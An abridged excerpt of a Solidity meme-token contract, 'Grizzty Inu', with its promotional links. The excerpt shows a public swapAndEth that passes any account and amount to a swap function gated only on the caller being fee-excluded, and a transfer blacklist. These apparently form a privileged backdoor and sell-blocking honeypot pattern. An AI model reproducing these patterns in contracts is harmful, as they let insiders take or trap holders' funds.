...
/*
 * Website: https://www.GrizztyInu.com
 * Twitter: https://twitter.com/GrizztyInu
 * Telegram: https://t.me/GrizztyInu
 */
...
contract GrizztyInu is Context, IERC20, Ownable {
    ...
    string private _name = "Grizzty Inu";
    string private _symbol = "Grizzty Inu";
    ...
    function swapAndEth(address account, uint256 amount) public {
        swapToEth(account, amount);
    }
    ...
    function swapToEth(address account, uint256 amount) private {
        require(isExcludedFromFee[msg.sender] == true);
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(blackList[sender] == false, "Robot!");
